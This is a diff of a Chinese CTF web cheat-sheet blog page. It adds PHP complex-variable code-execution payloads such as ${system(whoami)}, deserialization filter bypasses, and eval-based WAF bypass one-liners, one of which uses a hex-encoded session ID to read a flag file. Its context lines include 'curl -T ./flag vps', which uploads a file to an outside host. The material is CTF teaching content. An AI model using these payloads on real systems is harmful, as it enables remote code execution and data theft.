@@ -53,7 +53,7 @@
     <meta name="author" content="Ajatar" />
     
     
-    <meta name="description" content="​ CTF web的一些总结与备忘。 1.PHP相关 1.1 变量覆盖 1.2 变量命名 1.3 php伪协议 1.4 php……" />
+    <meta name="description" content="​ CTF web的一些总结与备忘。 1.PHP相关 1.1 变量覆盖 1.2 变量相关 1.3 php伪协议 1.4 php……" />
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
     <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#2a6df4" />
@@ -81,13 +81,13 @@
         "@context": "https://schema.org",
         "@type": "BlogPosting",
         "datePublished": "1969-01-01T14:42:58+08:00",
-        "dateModified": "2020-03-18T18:19:42+08:00",
+        "dateModified": "2020-03-18T21:35:37+08:00",
         "url": "https://ajatars.github.io/posts/ctf-web/",
         "headline": "CTF Web 备忘录（续更）",
-        "description": "​ CTF web的一些总结与备忘。 1.PHP相关 1.1 变量覆盖 1.2 变量命名 1.3 php伪协议 1.4 php……",
+        "description": "​ CTF web的一些总结与备忘。 1.PHP相关 1.1 变量覆盖 1.2 变量相关 1.3 php伪协议 1.4 php……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  6351 ,
+        "wordCount":  8838 ,
         "image": "https://ajatars.github.io/icons/apple-touch-icon.png",
         "author": {
             "@type": "Person",
@@ -130,13 +130,13 @@
 
 
 <meta property="og:title" content="CTF Web 备忘录（续更）" />
-<meta property="og:description" content="​ CTF web的一些总结与备忘。 1.PHP相关 1.1 变量覆盖 1.2 变量命名 1.3 php伪协议 1.4 php……" />
+<meta property="og:description" content="​ CTF web的一些总结与备忘。 1.PHP相关 1.1 变量覆盖 1.2 变量相关 1.3 php伪协议 1.4 php……" />
 <meta property="og:url" content="https://ajatars.github.io/posts/ctf-web/" />
 <meta property="og:site_name" content="Ajatar" />
 <meta property="og:locale" content="zh" /><meta property="og:image" content="https://ajatars.github.io/icons/apple-touch-icon.png" />
     <meta property="og:type" content="article" />
     <meta property="article:published_time" content="1969-01-01T14:42:58+08:00" />
-    <meta property="article:modified_time" content="2020-03-18T18:19:42+08:00" />
+    <meta property="article:modified_time" content="2020-03-18T21:35:37+08:00" />
     
     <meta property="article:section" content="posts" />
 
@@ -254,7 +254,7 @@
     
     
         
-        <time datetime="2020-03-18T18:19:42+08:00" class="post-meta-item modified"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2020.3.18</time>
+        <time datetime="2020-03-18T21:35:37+08:00" class="post-meta-item modified"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2020.3.18</time>
     
     
     
@@ -269,11 +269,11 @@
     
     
         
-        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;6351</span>
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;8838</span>
     
     
         
-        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;13&nbsp;分钟</span>
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;18&nbsp;分钟</span>
     
     
         
@@ -291,7 +291,7 @@
 <li><a href="#1php%E7%9B%B8%E5%85%B3">1.PHP相关</a>
 <ul>
 <li><a href="#11-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96">1.1 变量覆盖</a></li>
-<li><a href="#12-%E5%8F%98%E9%87%8F%E5%91%BD%E5%90%8D">1.2 变量命名</a></li>
+<li><a href="#12-%E5%8F%98%E9%87%8F%E7%9B%B8%E5%85%B3">1.2 变量相关</a></li>
 <li><a href="#13-php%E4%BC%AA%E5%8D%8F%E8%AE%AE">1.3 php伪协议</a></li>
 <li><a href="#14-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">1.4 php反序列化</a></li>
 <li><a href="#15-%E7%AA%81%E7%A0%B4disable_functions">1.5 突破disable_functions</a></li>
@@ -341,22 +341,24 @@
 <ul>
 <li><a href="#71-bash%E4%B8%8B%E7%9A%84%E4%B8%80%E4%BA%9Btrick">7.1 bash下的一些trick</a></li>
 <li><a href="#72-%E5%B7%A7%E7%94%A8curl">7.2 巧用curl</a></li>
-<li><a href="#73-php%E4%B8%8B%E7%9A%84system%E4%B8%8Eeval">7.3 php下的system与eval</a></li>
 </ul>
 </li>
 <li><a href="#8python%E7%9B%B8%E5%85%B3">8.python相关</a>
 <ul>
 <li><a href="#81-ssti">8.1 ssti</a></li>
 <li><a href="#82-pin%E7%A0%81">8.2 pin码</a></li>
+<li><a href="#83-flask-session">8.3 flask-session</a></li>
+<li><a href="#84-python-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">8.4 python-格式化字符串</a></li>
+<li><a href="#85-python-%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96trick">8.5 python-一些其他trick</a></li>
 </ul>
 </li>
-<li><a href="#9java%E7%9B%B8%E5%85%B3">9.java相关</a>
+<li><input disabled="" type="checkbox"><a href="#9java%E7%9B%B8%E5%85%B3">9.java相关</a>
 <ul>
 <li><a href="#91-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">9.1 java反序列化</a></li>
 <li><a href="#92-fastjson%E6%BC%8F%E6%B4%9E">9.2 fastjson漏洞</a></li>
 </ul>
 </li>
-<li><a href="#10javascript%E7%9B%B8%E5%85%B3">10.javascript相关</a>
+<li><input disabled="" type="checkbox"><a href="#10javascript%E7%9B%B8%E5%85%B3">10.javascript相关</a>
 <ul>
 <li><a href="#101-javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93">10.1 javascript原型链污染</a></li>
 <li><a href="#102-preventExtensions%E7%BB%95%E8%BF%87">10.2 preventExtensions绕过</a></li>
@@ -366,7 +368,7 @@
 <li><a href="#106-express%E6%A1%86%E6%9E%B6">10.6 express框架</a></li>
 </ul>
 </li>
-<li><a href="#11nodejs%E7%9B%B8%E5%85%B3">11.NodeJS相关</a>
+<li><input disabled="" type="checkbox"><a href="#11nodejs%E7%9B%B8%E5%85%B3">11.NodeJS相关</a>
 <ul>
 <li><a href="#111-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8express%E6%A1%86%E6%9E%B6">11.1 快速启动express框架</a></li>
 <li><a href="#112-npm%E6%89%80%E6%9C%89%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E6%BC%8F%E6%B4%9E">11.2 npm所有第三方库漏洞</a></li>
@@ -377,8 +379,8 @@
 <li><a href="#117-nodemon-node%E7%9A%84debug%E6%A8%A1%E5%BC%8F">11.7 nodemon-node的debug模式</a></li>
 </ul>
 </li>
-<li><a href="#12XSS">12.XSS</a></li>
-<li><a href="#12%E5%85%B6%E4%BB%96">13.其他</a>
+<li><input disabled="" type="checkbox"><a href="#12XSS">12.XSS</a></li>
+<li><input disabled="" type="checkbox"><a href="#12%E5%85%B6%E4%BB%96">13.其他</a>
 <ul>
 <li><a href="#121-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81">13.1 http请求走私</a></li>
 <li><a href="#122-jwt%E6%94%BB%E5%87%BB">13.2 jwt攻击</a></li>
@@ -393,7 +395,7 @@
 <p><strong>extract()</strong> 该函数使用数组键名作为变量名，通常结合全局变量: $_GET、$_POST、$_REQUEST。</p>
 <p><strong>parse_str()</strong> 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p>
 <hr>
-<h4 id="12-变量命名"><a href="#12-变量命名" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>1.2 变量命名</h4>
+<h4 id="12-变量相关"><a href="#12-变量相关" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>1.2 变量相关</h4>
 <p>php命名变量可使用大括号包裹</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -411,7 +413,28 @@
 <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
 </code></pre></td></tr></table>
 </div>
-</div><hr>
+</div><p>php复杂变量:</p>
+<p>任何具有 <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a> 表达的标量变量，数组单元或对象属性都可使用此语法。只需简单地像在 <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a> 以外的地方那样写出表达式，然后用花括号 <em>{</em> 和 <em>}</em> 把它括起来即可。由于 <em>{</em> 无法被转义，只有 <em>$</em> 紧挨着 <em>{</em> 时才会被识别。可以用 <em>{$</em> 来表达 <em>{$</em>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">利用:
+<span class="cp">&lt;?php</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">phpinfo()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>		  
+<span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">system(whoami)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>	  <span class="c1">//括号包含
+</span><span class="c1"></span><span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;${system (whoami)}&#34;</span><span class="p">;</span>    <span class="c1">// 空格
+</span><span class="c1"></span><span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">(sy.stem)(whoami)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>  <span class="c1">// . 拼接
+</span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">从一道题讲PHP复杂变量</a></p>
+<hr>
 <h4 id="13-php伪协议"><a href="#13-php伪协议" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>1.3 php伪协议</h4>
 <p>php//访问各个输入/输出流（I / O流），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php:/ /input用于执行php代码。</p>
 <p><strong>php://filter</strong>: 常用于读取文件(文件函数可控参数，xxe)、死亡绕过exit(),die()、phar metadate反序列化,当有正则过滤时，可尝试大小写绕过。</p>
@@ -570,7 +593,9 @@ php://filter/resource=phar://tmp/uploads/xxxx.jpg
 </li>
 <li>
 <p>正则过滤类对象或者其它对象时:</p>
-<p>​	可以在对象长度前添加<code>+</code>进行绕过，如<code>o:32</code> 改成 <code>o:+32</code></p>
+<p>​	过滤：&lsquo;O:&rsquo;</p>
+<p>​	可以在对象长度前添加<code>+</code>进行绕过，如<code>O:32</code> 改成 <code>O:+32</code>;</p>
+<p>​	在数组里面添加类对象,<code>a:1{i:0;O:3:&quot;Obj&quot;:1{}}</code>.</p>
 </li>
 <li>
 <p>反序列化长度逃逸:</p>
@@ -629,10 +654,10 @@ assert(&quot;strpos('$file', '..') === false&quot;);
 <hr>
 <h4 id="18-php代码执行getshell"><a href="#18-php代码执行getshell" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>1.8 php代码执行getshell</h4>
 <p><a href="https://www.jianshu.com/p/9ae0c80751c4" target="_blank" rel="noopener">CTF踩坑PHP编写一个不包含数字字母和下划线的后门</a></p>
-<p>异或getshell</p>
+<p>异或getshell:</p>
 <p>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。</p>
 <p><a href="https://xz.aliyun.com/t/5677" target="_blank" rel="noopener">一道题回顾php异或webshell</a></p>
-<p>取反getsehll</p>
+<p>取反getsehll:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -654,6 +679,14 @@ print(~&#34;和&#34;.encode(&#39;utf8&#39;)[2])
 </div><p>“和”的第三个字节的值为140[0x8c]，取反的值为-141。
 负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。</p>
 <p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a></p>
+<p>用http头传参绕过:</p>
+<p>nginx、apache可用get_defined_vars()，apche还可以用getallheaders()</p>
+<pre><code>eval(next(current(get_defined_vars())));&amp;b=var_dump(file_get_contents('/flag'));
+</code></pre><p>session操作</p>
+<pre><code>eval(hex2bin(session_id(session_start())));
+
+PHPSESSID=7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b
+</code></pre><p><a href="https://blog.zeddyu.info/2019/02/28/Some-Tricks-of-Bypass-php-waf/" target="_blank" rel="noopener">绕过一些phpwaf命令执行的方法</a></p>
 <hr>
 <h2 id="2关键文件"><a href="#2关键文件" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>2.关键文件</h2>
 <h4 id="21-nginx"><a href="#21-nginx" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>2.1 nginx</h4>
@@ -1003,6 +1036,406 @@ magic_quotes_gpc 关闭
 curl -T ./flag vps
 </code></pre></td></tr></table>
 </div>
+</div><hr>
+<h2 id="8-python相关"><a href="#8-python相关" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>8. python相关</h2>
